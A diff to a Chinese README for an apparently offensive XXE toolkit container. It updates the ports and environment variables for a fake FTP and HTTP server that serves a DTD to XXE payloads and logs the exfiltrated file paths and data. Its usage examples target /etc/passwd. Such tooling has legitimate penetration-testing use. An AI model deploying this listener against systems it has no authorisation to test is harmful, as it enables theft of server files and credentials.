@@ -43,10 +43,10 @@ python3 fake-ftp-server.py <port> [选项]
 
 # 示例
 python3 fake-ftp-server.py 2121                           # 仅启动 FTP 服务器
-python3 fake-ftp-server.py 2121 -w 8080                   # 启动 FTP + HTTP 服务器
-python3 fake-ftp-server.py 2121 -w 8080 -f /etc/passwd    # 指定目标文件
-python3 fake-ftp-server.py 2121 -w 8080 --ip 1.2.3.4      # 指定公网 IP
-python3 fake-ftp-server.py 2121 -w 8080 -o data.log       # 保存捕获数据
+python3 fake-ftp-server.py 2121 -w 8087                   # 启动 FTP + HTTP 服务器
+python3 fake-ftp-server.py 2121 -w 8087 -f /etc/passwd    # 指定目标文件
+python3 fake-ftp-server.py 2121 -w 8087 --ip 1.2.3.4      # 指定公网 IP
+python3 fake-ftp-server.py 2121 -w 8087 -o data.log       # 保存捕获数据
 ```
 
 同样通过环境变量映射到容器内参数。
@@ -63,7 +63,7 @@ python3 fake-ftp-server.py 2121 -w 8080 -o data.log       # 保存捕获数据
   `SimpleSMBServer` 的 SMB 端口（**TCP 445**）。
 - `FAKE_FTP_PORT`（默认 `2121`）  
   `fake-ftp-server.py` 的 FTP 监听端口。
-- `FAKE_FTP_HTTP_PORT`（默认 `8080`）  
+- `FAKE_FTP_HTTP_PORT`（默认 `8087`）  
   `fake-ftp-server.py` 的 HTTP 服务器端口，用于提供 `data.dtd`。
 
 在提供的 `docker-compose.yml` 中示例映射为：
@@ -73,7 +73,7 @@ ports:
   - "8088:8088"   # HTTP (xxe-smb-server)
   - "445:445"     # SMB
   - "2121:2121"   # fake-ftp-server
-  - "8080:8080"   # HTTP (fake-ftp-server DTD)
+  - "8087:8087"   # HTTP (fake-ftp-server DTD)
 ```
 
 > 注意：宿主机的 445 端口可能已被系统或其他服务占用，必要时可以改成 `1445:445` 之类的映射。
@@ -112,6 +112,10 @@ python3 /app/xxe-smb-server/xxe-smb-server.py \
 
 ### fake-ftp-server（路径 sniffer + HTTP DTD 服务器）
 
+- `XXE_FTP_PUBLIC_IP`（必选，默认 `127.0.0.1`）
+
+  假 FTP 服务器对外提供给 XXE payload 使用的"公网 IP"或可达 IP。
+
 - `FAKE_FTP_PORT`（必选，默认 `2121`）
 
   假 FTP 服务器监听端口。
@@ -121,7 +125,7 @@ python3 /app/xxe-smb-server/xxe-smb-server.py \
   如果设置，则所有捕获到的 `RETR` 路径会被追加写入该文件。  
   例如 `/var/log/ftp_paths.log`。
 
-- `FAKE_FTP_HTTP_PORT`（可选，默认 `8080`）
+- `FAKE_FTP_HTTP_PORT`（可选，默认 `8087`）
 
   HTTP 服务器端口，用于提供 `data.dtd` 文件供 XXE payload 调用。
 
@@ -134,7 +138,7 @@ python3 /app/xxe-smb-server/xxe-smb-server.py \
 
 ```bash
 python3 /app/fake-ftp-server/fake-ftp-server.py ${FAKE_FTP_PORT} \
-  --ip ${XXE_SMB_PUBLIC_IP} \
+  --ip ${XXE_FTP_PUBLIC_IP} \
   --http-port ${FAKE_FTP_HTTP_PORT} \
   --file ${FAKE_FTP_FILE_PATH} \
   [--output ${FAKE_FTP_LOG_FILE}]
@@ -158,7 +162,9 @@ cd xxe-toolkits-server
 ```yaml
 XXE_SMB_PUBLIC_IP: "你的对外IP"
 XXE_SMB_WEB_PORT: "8088"
+XXE_FTP_PUBLIC_IP: "你的对外IP"
 FAKE_FTP_PORT: "2121"
+FAKE_FTP_HTTP_PORT: "8087"
 FAKE_FTP_LOG_FILE: "/var/log/ftp_paths.log"
 ```
 
@@ -207,13 +213,14 @@ docker run --rm \
   -e XXE_SMB_PUBLIC_IP=192.168.1.100 \
   -e XXE_SMB_WEB_PORT=8088 \
   -e XXE_SMB_SHARE_PATH=/share \
+  -e XXE_FTP_PUBLIC_IP=192.168.1.100 \
   -e FAKE_FTP_PORT=2121 \
-  -e FAKE_FTP_HTTP_PORT=8080 \
+  -e FAKE_FTP_HTTP_PORT=8087 \
   -e FAKE_FTP_LOG_FILE=/var/log/ftp_paths.log \
   -p 8088:8088 \
   -p 445:445 \
   -p 2121:2121 \
-  -p 8080:8080 \
+  -p 8087:8087 \
   -v $(pwd)/share:/share \
   -v $(pwd)/logs:/var/log \
   ghcr.io/mr-xn/xxe-toolkits-server:latest
